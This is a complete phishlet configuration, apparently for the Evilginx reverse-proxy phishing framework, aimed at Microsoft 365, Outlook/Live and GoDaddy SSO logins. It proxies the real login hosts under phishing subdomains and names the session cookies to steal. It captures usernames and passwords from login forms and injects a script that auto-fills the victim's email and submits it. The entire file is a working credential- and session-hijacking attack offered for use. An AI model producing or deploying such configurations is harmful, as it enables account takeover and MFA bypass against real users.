author: '@An0nud4y'
min_ver: '2.3.0'
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: true}
  - {phish_sub: '', orig_sub: '', domain: 'microsoftonline.com', session: true, is_landing: false}
  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msauth.net', session: false, is_landing: false}
  - {phish_sub: 'office365', orig_sub: 'outlook', domain: 'office365.com', session: false, is_landing: false}
  - {phish_sub: 'res', orig_sub: 'r4.res', domain: 'office365.com', session: false, is_landing: false}
  - {phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing: false}
  - {phish_sub: 'sso1', orig_sub: 'sso1', domain: 'secureserver.net', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false}
  - {phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing: false}
  - {phish_sub: 'img1', orig_sub: 'img1', domain: 'wsimg.com', session: true, is_landing: false}
  - {phish_sub: 'img6', orig_sub: 'img6', domain: 'wsimg.com', session: true, is_landing: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: true}
  - {phish_sub: 'cdn', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'storage', orig_sub: 'storage', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'live.com', session: true, is_landing: false}
  - {phish_sub: 'microsoft', orig_sub: 'account', domain: 'microsoft.com', session: false, is_landing: false}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft.com', session: true, is_landing: false}
  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false}
  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.nl', session: true, is_landing: false}  # Fixed typo

sub_filters:
  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
  # Removed redundant filters where search == replace

auth_tokens:
  - domain: '.login.microsoftonline.com'
    keys: ['ESTSAUTHPERSISTENT', 'ESTSAUTH', 'ch', 'CCState', 'CcsSharedSignInState']
  - domain: 'login.microsoftonline.com'
    keys: ['ESTSAUTHLIGHT', 'ESTSSC', 'SignInStateCookie']
  - domain: '.login.live.com'
    keys: ['MSPOK']
  - domain: '.live.com'
    keys: ['WLSSC', 'MSPAuth']  # Example of more specific keys
  - domain: 'outlook.live.com'
    keys: ['O365Consumer']
  - domain: 'sso.secureserver.net'
    keys: ['sso_token']
  - domain: '.microsoft.com'
    keys: ['MUID']
  - domain: '.account.microsoft.com'
    keys: ['MSID']
  - domain: 'sso.godaddy.com'
    keys: ['gd_sso']

auth_urls:
  - '/*'
  - '/auth'
  - '/auth/*'

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

force_post:
  - path: '/ppsecure/post.srf'
    search:
      - {key: 'login', search: '[^&]+'}  # Narrowed to match realistic input
      - {key: 'passwd', search: '[^&]+'}
    force:
      - {key: 'KMSI', value: 'on'}
    type: 'post'

login:
  domain: 'login.live.com'
  path: 'login.srf'

js_inject:
  - trigger_domains: ["login.microsoftonline.com", "login.live.com"]
    trigger_paths: ["/common/oauth2/", "/*"]
    script: |
      function lp(attempts = 0, maxAttempts = 20) {
        if (attempts >= maxAttempts) {
          console.log("Max attempts reached, stopping.");
          return;
        }
        var emailId = document.querySelector("#i0116");
        var nextButton = document.querySelector("#idSIButton9");
        var query = window.location.href;
        if (/#/.test(query)) {
          var [data1, data2] = query.split("#");
          if (emailId && nextButton) {
            var decodedString = data2;
            if (/^[A-Za-z0-9+/=]*$/.test(data2) && data2.length > 0) { // Improved base64 check
              try {
                decodedString = atob(data2.replace(/=/g, '')); // Remove padding for decoding
              } catch (e) {
                console.error('Error decoding base64 string:', e);
                decodedString = data2; // Fallback to raw string
              }
            }
            emailId.value = decodedString;
            emailId.dispatchEvent(new Event('input')); // Trigger input event
            nextButton.click();
            console.log("Filled email and clicked next!");
            return;
          }
        }
        setTimeout(() => lp(attempts + 1, maxAttempts), 500);
      }
      setTimeout(() => lp(), 500);
